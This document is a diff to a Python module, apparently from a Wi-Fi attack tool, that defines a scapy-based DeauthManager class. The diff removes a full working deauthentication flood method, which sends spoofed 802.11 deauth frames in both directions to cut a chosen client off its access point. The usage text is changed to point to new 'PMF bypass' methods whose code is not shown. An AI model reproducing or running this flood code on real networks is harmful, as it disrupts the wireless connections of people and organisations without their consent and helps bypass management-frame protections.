@@ -12,8 +12,8 @@ Requirements:
 
 Usage:
   deauth = DeauthManager(bssid="AA:BB:CC:DD:EE:FF", iface="wlan0mon")
-  deauth.deauth(ip="192.168.1.5", client_mac="11:22:33:44:55:66")
-  deauth.stop(ip="192.168.1.5")
+  deauth.start_pmf_bypass(target_mac="11:22:33:44:55:66")
+  deauth.stop_pmf_bypass(target_mac="11:22:33:44:55:66")
   deauth.stop_all()
 """
 from __future__ import annotations
@@ -23,7 +23,7 @@ import subprocess
 import threading
 import time
 from scapy.all import (
-    RadioTap, Dot11, Dot11Deauth, Dot11Auth, 
+    RadioTap, Dot11, Dot11Auth,
     sendp
 )
 
@@ -114,54 +114,11 @@ class DeauthManager:
                     pass
             time.sleep(1)
 
-    def deauth(self, ip: str, client_mac: str):
-        """
-        Launch a continuous deauth flood against client_mac (associated to self._bssid).
-        ip is used as the key for stop/management — client_mac is the actual target.
-        """
-        if not self._active or not client_mac:
-            return
-        self._stop_by_mac(client_mac)
-
-        stop_evt = threading.Event()
-        with self._lock:
-            self._stops[ip] = stop_evt
-
-        def _flood():
-            # Frame 1: AP → client "you are deauthenticated"
-            pkt1 = (
-                RadioTap() /
-                Dot11(addr1=client_mac, addr2=self._bssid, addr3=self._bssid) /
-                Dot11Deauth(reason=7))
-            # Frame 2: client → AP (spoofed — makes the AP also drop the client)
-            pkt2 = (
-                RadioTap() /
-                Dot11(addr1=self._bssid, addr2=client_mac, addr3=self._bssid) /
-                Dot11Deauth(reason=7))
-
-            while not stop_evt.is_set():
-                try:
-                    sendp(pkt1, iface=self._iface, count=self.BURST_COUNT,
-                          inter=0.01, verbose=False)
-                    sendp(pkt2, iface=self._iface, count=self.BURST_COUNT,
-                          inter=0.01, verbose=False)
-                except Exception:
-                    pass
-                stop_evt.wait(self.DEAUTH_INTERVAL)
-
-        threading.Thread(target=_flood, daemon=True,
-                         name=f"deauth_{client_mac}").start()
-
     def stop(self, ip: str):
         with self._lock:
             evt = self._stops.pop(ip, None)
         if evt:
             evt.set()
-
-    def _stop_by_mac(self, mac: str):
-        """Stop any existing flood targeting this MAC (by searching all stops)."""
-        # We match by checking if the thread name matches — just signal all for safety
-        pass  # Each ip key is unique; existing entry will be overwritten
 
     def stop_all(self):
         with self._lock:
